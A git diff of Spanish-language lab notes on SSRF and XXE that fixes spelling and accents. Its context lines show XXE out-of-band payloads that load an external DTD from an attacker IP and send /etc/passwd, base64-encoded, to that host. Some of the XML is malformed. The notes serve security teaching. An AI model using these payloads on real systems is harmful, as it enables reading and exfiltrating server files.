@@ -20,7 +20,7 @@ Un ataque SSRF implica enviar solicitudes HTTP desde el servidor hacia direccion
 
 Al explotar con éxito un SSRF, el atacante puede enviar solicitudes HTTP a servicios internos que de otra manera no estarían disponibles para la red externa. Esto puede permitir al atacante obtener **información sensible** o incluso **tomar el control** de los servicios internos.
 
-A continuación, se proporciona el enlace al proyecto de Github correspondiente al laboratorio que estaremos desplegando en esta clase para practicar esta vulnerabilidad:
+A continuación, se proporciona el enlace al proyecto de GitHub correspondiente al laboratorio que estaremos desplegando en esta clase para practicar esta vulnerabilidad:
 
 -   **XXELab**: [https://github.com/jbarone/xxelab](https://github.com/jbarone/xxelab)
 
@@ -35,7 +35,7 @@ También podemos explotar
 
 ## XML en la web
 
-* Usaremos XML como codigo para hacer los scripts. 
+* Usaremos XML como código para hacer los scripts. 
 * El campo en donde debemos de fijarnos es aquel que el **Input** es el que nos representa en la web como **Output**
 
 En el archivo XML debemos de colocar un DOCTYPE y ese es el que estaremos modificando
@@ -88,7 +88,7 @@ En el archivo XML debemos de colocar un DOCTYPE y ese es el que estaremos modifi
 ```
 
 ## **XXE OOB Blind**
-Cuando no se puede llamar la entidad desde el campo selecionado en la estructura, lo llamamos desde el DOCTYPE colocando el porcentaje al incio y final con el nombre. El archivo debe de tener la extension **.dtd**
+Cuando no se puede llamar la entidad desde el campo seleccionado en la estructura, lo llamamos desde el DOCTYPE colocando el porcentaje al inicio y final con el nombre. El archivo debe de tener la extensión **.dtd**
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 	<DOCTYPE foo [<! ENTITY % xxe SYSTEM "http://192.168.68.108/malicious.dtd"> %xxe;]>       <!-- Hara una peticion GET a nuestro servidor buscando el archivo testXXE -->
@@ -101,12 +101,12 @@ Cuando no se puede llamar la entidad desde el campo selecionado en la estructura
 	</root>
 ```
 
-* Asi es como hariamos un archivo .dtd externo
+* Así es como haríamos un archivo .dtd externo
 ```bash
 ❯ nvim malicious.dtd                        # Creamos el archivo malicioso
 ```
 
-* Haremos que el output en base64 me lo envie a mi maquina de atacante como una peticion por GET. Esto dentro del archivo  malicious.dtd
+* Haremos que el output en base64 me lo envié a mi maquina de atacante como una petición por GET. Esto dentro del archivo  malicious.dtd
 ```xml
 <! ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 <! ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.68.108/?file=%file;' >">                  <!-- Debemos de colocar el % en HEX = 25 --> 
